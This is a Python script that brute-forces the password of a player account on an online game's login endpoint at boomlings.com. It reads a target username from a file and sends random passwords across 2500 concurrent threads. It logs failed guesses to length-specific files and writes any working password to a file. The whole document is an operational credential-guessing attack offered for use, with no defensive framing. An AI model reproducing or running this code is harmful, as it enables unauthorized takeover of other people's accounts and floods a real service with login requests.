import requests
import random
from threading import Thread

head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }
url = 'http://www.boomlings.com/database/accounts/loginGJAccount.php'
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-'

def request():    
    
    random_num = random.randrange(6, 21)
    password = ''.join([random.choice(chars) for i in range(random_num)])
    if random_num == 6:
        if password in open('fails6.txt', 'r').read():
            pass
    if random_num == 7:
        if password in open('fails7.txt', 'r').read():
            pass
    if random_num == 8:
        if password in open('fails8.txt', 'r').read():
            pass
    if random_num == 9:
        if password in open('fails9.txt', 'r').read():
            pass
    if random_num == 10:
        if password in open('fails10.txt', 'r').read():
            pass
    if random_num == 11:
        if password in open('fails11.txt', 'r').read():
            pass
    if random_num == 12:
        if password in open('fails12.txt', 'r').read():
            pass
    if random_num == 13:
        if password in open('fails13.txt', 'r').read():
            pass
    if random_num == 14:
        if password in open('fails14.txt', 'r').read():
            pass
    if random_num == 15:
        if password in open('fails15.txt', 'r').read():
            pass
    if random_num == 16:
        if password in open('fails16.txt', 'r').read():
            pass
    if random_num == 17:
        if password in open('fails17.txt', 'r').read():
            pass
    if random_num == 18:
        if password in open('fails18.txt', 'r').read():
            pass
    if random_num == 19:
        if password in open('fails19.txt', 'r').read():
            pass
    if random_num == 20:
        if password in open('fails20.txt', 'r').read():
            pass
    r = 'udid=S15212864471883312752224026790081311001&userName=' + open("username.txt",'r').read() + '&password=' + str(password) + "&sID=76561200095338154&secret=Wmfv3899gc9"
    try:
        data = requests.post(url, data=r, headers=head).content.decode()
    finally:
        pass
    if data == '-1':
        print(data)
        if random_num == 6:
            open('fails6.txt', 'a').write(f'{password}\n')
        if random_num == 7:
            open('fails7.txt', 'a').write(f'{password}\n')
        if random_num == 8:
            open('fails8.txt', 'a').write(f'{password}\n')
        if random_num == 9:
            open('fails9.txt', 'a').write(f'{password}\n')
        if random_num == 10:
            open('fails10.txt', 'a').write(f'{password}\n')
        if random_num == 11:
            open('fails11.txt', 'a').write(f'{password}\n')
        if random_num == 12:
            open('fails12.txt', 'a').write(f'{password}\n')
        if random_num == 13:
            open('fails13.txt', 'a').write(f'{password}\n')
        if random_num == 14:
            open('fails14.txt', 'a').write(f'{password}\n')
        if random_num == 15:
            open('fails15.txt', 'a').write(f'{password}\n')
        if random_num == 16:
            open('fails16.txt', 'a').write(f'{password}\n')
        if random_num == 17:
            open('fails17.txt', 'a').write(f'{password}\n')
        if random_num == 18:
            open('fails18.txt', 'a').write(f'{password}\n')
        if random_num == 19:
            open('fails19.txt', 'a').write(f'{password}\n')
        if random_num == 20:
            open('fails20.txt', 'a').write(f'{password}\n')
    elif data.startswith('e'):
        pass
    elif data == '':
        pass
    elif data.startswith('\n'):
        pass
    elif data.startswith('<'):
        pass
    elif data.startswith('Maximum '):
        pass
    elif data == 'Bad Request':
        pass
    elif data == 'reset':
        pass
    else:
        open('successer.txt', 'a').write(('Password of the Data: %s' % r) + '\n')
        print("Got the password. It's " + password + ' data: ' + data)
        return None

for i in range(2500):
    try:
        t = Thread(target=request) 
        t.daemon = True
        t.start()
    except KeyboardInterrupt:
        pass
